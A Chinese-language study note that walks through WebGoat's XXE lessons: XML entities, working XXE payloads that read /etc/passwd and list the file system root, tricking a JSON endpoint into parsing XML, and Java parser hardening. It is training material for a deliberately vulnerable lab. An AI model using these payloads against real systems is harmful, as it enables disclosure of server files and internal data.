---
id: 
title: XXE
---
<!-- muse start -->
Web Goat 的 XXE 简介，包含编程语言对 XML 的处理，修改请求体类型以发送预期外格式。
从原格式的普通输入开始，逐步修改并根据响应（错误信息）探测与调整载荷。
<!-- muse end -->

## 2. 什么是 XML 实体？

XML 实体允许定义一些标签，这些标签在 XML 文档被解析时会被内容替换。通常，实体有三种类型：

- 内部实体
- 外部实体
- 参数实体

实体必须在文档类型定义（DTD）中创建，让我们从一个示例开始：

![xxe-parser](./images/xxe-parser.png)
*Web Goat: xxe-parser*

如您所见，一旦 XML 文档被解析器处理，它将把定义的实体 `js` 替换为定义的常量 "Jo Smith"。这有很多优点，例如您可以在一处将 `js` 更改为 "John Smith"。

在 Java 应用程序中，XML 可用于从客户端向服务器获取数据。我们都熟悉 JSON API，同样也可以使用 XML 来传递信息。大多数情况下，框架会根据 XML 结构自动填充 Java 对象，例如：

![xxe-parser](./images/xxe-parser-java.png)
*Web Goat: xxe-parser-java*

### 什么是 XXE 注入？

XML 外部实体攻击是一种针对解析 XML 输入的应用程序的攻击。当配置不当的 XML 解析器处理包含外部实体引用的 XML 输入时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描，以及其他系统影响。

攻击可能包括泄露本地文件（这些文件可能包含密码或私人用户数据等敏感数据），方法是使用 `file:` 方案或系统标识符中的相对路径。由于攻击是相对于处理 XML 文档的应用程序发生的，攻击者可能利用这个受信任的应用程序跳转到其他内部系统，可能通过 http(s) 请求泄露其他内部内容，或对任何未受保护的内部服务发起 CSRF 攻击。在某些情况下，通过解引用恶意 URI，可能会利用存在客户端内存损坏问题的易受攻击的 XML 处理器库，从而允许在应用程序帐户下执行任意代码。其他攻击可能访问可能不会停止返回数据的本地资源，如果过多的线程或进程未被释放，则可能影响应用程序的可用性。

通常，我们可以区分以下类型的 XXE 攻击：

- **经典攻击**：在这种情况下，外部实体被包含在本地 DTD 中。
- **盲注攻击**：响应中不显示任何输出和/或错误。
- **错误攻击**：尝试在错误消息中获取资源的内容。

## 3. XXE 示例

让我们来看一个 XXE 注入的示例。在上一节中，我们看到 XML 实体可以按以下方式使用：

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```

### 外部 DTD 声明

定义这些实体也使得可以从外部文件中加载另一个 DTD，例如：

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "email.dtd">
<email>
  <to>webgoat@webgoat.org</to>
  <from>webwolf@webwolf.org</from>
  <subject>Your app is great, but contains flaws</subject>
  <body>Hi, your application contains some SQL injections</body>
</email>
```

而 `email.dtd` 可以定义如下：

```xml
<!ELEMENT email (to,from,title,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT subject (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

### XXE

如果 XML 解析器被配置为允许外部 DTD 或实体，我们可以将以下 XML 片段更改为：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
  <!ENTITY js SYSTEM "file:///etc/passwd">
]>
<author>&js;</author>
```

现在会发生什么？我们定义了一个从本地文件系统的包含，XML 解析器将加载该文件，并将内容添加到实体被引用的任何地方。假设 XML 消息返回给用户，则消息将是：

![etc_password](./images/etc_password.png)
*Web Goat: etc_password*

> [!NOTE]
额外的文档类型定义（DOCTYPE）是您可以随时添加到 XML 文档中的内容，如果解析器设置启用了允许处理外部实体，那么您就为发现 XXE 注入开了一个好头。

## 4. 让我们尝试

在此任务中，您将为照片添加一条评论。提交表单时，请尝试通过评论字段执行 XXE 注入。尝试列出文件系统的根目录。

发送测试信息
```http
POST /WebGoat/xxe/simple HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
    <comment>
        <text>foooo</text>
    </comment>
```
请求格式为 XML

修改请求体
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///">
]>
    <comment>
        <text>&xxe;</text>
    </comment>
```
评论发布并显示目录内容

XML 按照特定格式进行信息检索，在开头定义实体，保存原文的上下文标签并在其中引用实体。

## 5. 任务解决方案

本次练习的目标是列出文件系统的根目录。如果我们首先尝试正常的POST请求，会看到以下请求：

```http
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?><comment><text>This is my first comment, nice picture</text></comment>
```

网页正在发起一个XHR请求来提交XML消息，随后评论内容会显示在评论区域。现在让我们尝试按照前一节所示修改请求：

```http
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
```

这里我们不再引用特定文件，而是通过`file:///`引用文件系统的根目录。如果直接将此内容复制粘贴到评论文本框，响应体中会出现错误：

```json
{
  "lessonCompleted" : false,
  "feedback" : "Sorry the solution is not correct, please try again.",
  "output" : "...javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,44]\\nMessage: The processing instruction target matching \\\"[xX][mM][lL]\\\" is not allowed.]"
  "assignment" : "SimpleXXE",
  "attemptWasMade" : true
}
```

这是因为JavaScript接收输入后创建了以下消息：

```http
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?>
<comment>
  <text>
    <?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
  </text>
</comment>
```

如果使用评论表单，第7行将包含在文本框中输入的文本。

要完成本课程，您需要拦截完整的出站请求，并将整个请求体替换为解决方案。请参阅我们关于拦截HTTP流量的相关课程。

## 6. 通过代码审查发现XXE

既然我们已经了解了注入的工作原理，接下来让我们看看这种情况为何会发生。在Java应用程序中，XML库的配置默认是不安全的，您必须更改其设置。假设您在代码审查期间发现了以下代码片段：

```java
public XmlMapper xmlMapper() {
  return new XmlMapper(XMLInputFactory.newInstance()) 
}
```

同时，在查看Jackson库的发行说明时，您读到：
> 211: 除非显式重写，否则为`XMLInputFactory`禁用`SUPPORT_DTD`
> — Jackson 2.7.8 (2016年9月26日)

**问题：该解析器是否易受攻击？**

这段代码定义了一个新的`XmlMapper`（`ObjectMapper`），这是一个用于读写XML和JSON的流行框架。如果我们深入一层查看代码，会发现：

```java
/**
 * @since 2.4
 */
public XmlMapper(XMLInputFactory inputF) {   
  this(new XmlFactory(inputF));  
}
```

使用第一个代码块调用的构造函数 `XmlMapper`，调用另一个构造函数 `XMLInputFactory`并初始化一个新的`XmlFactory`实例。

即，`XmlFactory` -> `XmlMapper` -> `xmlMapper`

让我们看一下`XMLFactory`的源代码：

```java
// 这是在 `protected XmlFactory` 中创建的新实例的“构造函数”定义。
public XmlFactory(XMLInputFactory xmlIn) {  
  // 调用在 `protected XmlFactory` 中定义的另一个“构造函数”。
  this(xmlIn, null); 
}  

protected XmlFactory(XMLInputFactory xmlIn, XMLOutputFactory xmlOut, ...) { 
  if (xmlIn == null) {  
    xmlIn = XMLInputFactory.newInstance();
    // as per [dataformat-xml#190], disable external entity expansion by default
    xmlIn.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);  
    // and ditto wrt [dataformat-xml#211], SUPPORT_DTD
    xmlIn.setProperty(XMLInputFactory.SUPPORT_DTD, Boolean.FALSE); 
  }
}
```

在`protected XmlFactory`中，我们知道`if (xmlIn == null)`不会为真，因为查看顶部的声明，我们创建了自己的`XMLInputFactory.newInstance()`实例，它不为`null`。这意味着我们拥有一个默认情况下不防御XXE注入的XML解析器。
有趣的部分在于嵌套在if语句内的额外保护措施。

如果我们以Spring Boot框架为例，看看它们如何初始化相同的解析器：

```java
public ObjectMapper create() {
  // 调用一个方法，该方法会安全地初始化解析器。
  return new XmlMapper(xmlInputFactory());  
}

private static XMLInputFactory xmlInputFactory() {
  XMLInputFactory inputFactory = XMLInputFactory.newInstance();
  inputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
  inputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
  return inputFactory;
}
```

如你所见，通过私有方法 `xmlInputFactory()` 显式定义了 `XMLInputFactory`，该方法实际上为解析器设置了与我们在上一个代码片段中看到的未被设置的相同属性。

由此可见，要查明解析器是否能够抵御此类注入并非易事，您确实需要深入代码和库内部，才能确定解析器的具体设置。

请查阅 [XXE防御指南](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)  以获取更多保护解析器的方法。


## 7. 现代 REST 框架

在现代 REST 框架中，服务器可能能够接受开发者未曾预料到的数据格式。这可能导致 JSON 端点易受 XXE 攻击。

请再次执行相同的练习，尝试执行与第一个任务中相同的 XML 注入。

发送请求并查看
```http
POST /WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/json

{"text":"fooooo"}
```

修改请求头 `Content-Type: application/xml`，以及替换请求体为 XML 格式
```xml
POST /WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///">
]>
    <comment>
        <text>&xxe;</text>
    </comment>
```

此处直接使用之前的 XML 格式通过挑战，但实际上应当略微修改后提交并根据响应（错误信息）逐渐调整。

示例解决方案步骤：
1. 使用原 JSON 请求体，修改头部的内容类型为 XML，响应为 XML 解析错误
2. 修改请求体为普通的 XML 格式，错误信息显示的缺乏预期元素
    `Expected elements are <{}comment>`
3. 添加外层元素后再次发送，此时普通文本被成功添加到评论
4. 构建 XXE

## 8. 任务解决方案

本任务的核心思路是：虽然应用程序看起来只接受JSON格式，但如果我们将消息体更改为XML，框架仍可能处理它。当您尝试提交评论时，请求体原本是：

```json
{"text":"My first comment"}
```

这是一个正常的JSON消息。现在尝试更改请求的Content-Type头部：

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

{"text":"My first comment"}
```

这将导致以下异常：

```text
javax.xml.bind.UnmarshalException\n - with linked exception:\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,1]\nMessage: Content is not allowed in prolog.
```

根据使用的XML解析器不同，您可能会得到更详细的错误信息。本例中的错误信息较为隐晦，意味着我们发送的不是有效的XML。例如，Jackson库会返回如下信息：

```text
JSON parse error: Unexpected character '{' (code 123) in prolog; expected
      '<'\n at [row,col {unknown-source}]: [1,1]; nested exception is com.fasterxml.jackson.core.JsonParseException:
      Unexpected character '{' (code 123) in prolog; expected '<'\n at [row,col {unknown-source}]: [1,1]“
```

出现此错误是因为我们仍然向端点发送JSON消息。因此，如果我们拦截请求并将JSON消息替换为XML消息：

```POST
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<text>This is my first message</text>
```

端点会再次返回错误：

```
"javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[com.sun.istack.SAXParseException2; lineNumber: 1; columnNumber: 7; unexpected element (uri:\\\"\\\", local:\\\"text\\\"). Expected elements are <{}comment>]
```

解析器报错指出消息不是有效的XML格式，需要嵌入在`comment`标签中：

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<comment><text>This is my first message</text></comment>
```

此时端点不再报错，如果您刷新WebGoat页面，提交的评论将会显示。要使攻击生效，我们需要提交：

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;This is my first message</text></comment>
```

在某些企业的网络环境中，如果此载荷通过HTTP发送，某些网络设备可能会完全丢弃它。这种情况下`POST`请求不会收到响应，端点也永远不会收到该请求。然而，这类防护措施作用有限，因为在HTTPS设置中，相同的请求会成功通过，因为载荷会被加密传输。

## 9. TODO